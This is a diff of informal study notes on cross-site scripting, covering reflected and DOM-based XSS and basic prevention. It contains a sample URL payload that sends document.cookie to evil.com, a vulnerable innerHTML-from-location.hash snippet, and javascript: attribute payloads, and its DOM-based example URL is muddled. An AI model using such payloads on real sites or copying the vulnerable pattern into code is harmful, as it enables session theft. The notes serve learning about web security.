@@ -94,9 +94,49 @@ lets say the website is a serach page which displays the search query to screen 
 - Attacker sends a link chekout the cute puppies on this page where 'this' is hyperlinked to 
 ``` http://www.trustedsearch.com?query=<script> 
 window.location="http://www.evil.com/?cookie="+document.cookie;
-</script> ```
+</script> 
+```
+- The victim's browser will execute that script and send his cookie info to attackers server
+- there is some social engg aspect to get the victim to click on the URL - it may be sent via email or posted somewhere on social media.
+- This can be further masked by using a URL shortening service such as Tiny URL or Bitly
 
-The victim
+##### DOMbased XSS
+The malicious script is injected somehow into the site - exactly as in the other cases.
+- The malicious script is not parsed by the website until it executes the legimate JS in the website
+- this is subtle - the malicious user input is not directly rendered as HTMl
+- instead the legitimate JS on the page - accesses the input and updates the page.
+``` html
+<html>
+ <script>
+  var hash = window.location.hash;
+  document.getElementByID('display-id').innerHTML = hash;
+ </script>
+ <div id="display-id"></div>
+</html>
+```
+- say the url is ``` http://www.trustedsite.com#boo ```
+- the legitimate JS in the page is first executed and that updates the HTML to include the unvalidated and unsanitized input.
+- so if it is
+``` http://www.trustedsite.com#<script>
+  var hash = window.location.hash;
+  document.getElementByID('display-id').innerHTML = hash;
+ </script>
+ ```
+- as web apps get more interactive and advanced client side scripting and DOM manipulation becomes more important.
+- JS is used to manipulate the DOM anytime you want to change the apage contents without reloading the whole page
+- this means that you need to be careful about XSS vulnerabilities in client side as well as server side code.
+- so server side validation is just not enough = Client side vulnerability
+
+### Preventing XSS
+
+- user input is always asumed to be malicious! and it should be treated as such.
+- user input should always be sanitized and validated before it is used.
+- so, where is user input possible? = many many places
+- enclosed as HTML content within HTML attributes
+- `<input value="userInput">`
+- `<img src="javascript:alert("XSS");">`
+- `<table background="javacsript:alert("xss");">`
+
 
    
    
